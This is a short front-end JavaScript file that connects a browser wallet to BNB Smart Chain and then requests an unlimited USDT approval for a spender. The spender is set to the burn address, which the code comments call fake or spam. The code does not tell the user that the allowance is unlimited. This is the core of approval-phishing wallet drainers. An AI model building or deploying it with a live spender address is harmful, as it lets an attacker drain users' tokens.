const connectBtn = document.getElementById("connectBtn");
const approveBtn = document.getElementById("approveBtn");

let signer;

connectBtn.onclick = async () => {
  if (window.ethereum) {
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // BNB Smart Chain Mainnet
      });

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      signer = provider.getSigner();
      const address = await signer.getAddress();
      alert("Connected: " + address);
    } catch (err) {
      console.error("Connection error", err);
    }
  } else {
    alert("Please install Binance Wallet or MetaMask");
  }
};

approveBtn.onclick = async () => {
  if (!signer) return alert("Connect wallet first");

  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP20)
  const spender = "0x000000000000000000000000000000000000dEaD"; // fake/spam address
  const abi = [
    "function approve(address spender, uint256 amount) public returns (bool)",
  ];
  const usdtContract = new ethers.Contract(usdtAddress, abi, signer);

  try {
    const tx = await usdtContract.approve(spender, ethers.constants.MaxUint256);
    alert("Approval sent. TX: " + tx.hash);
  } catch (err) {
    console.error(err);
    alert("Approval failed");
  }
};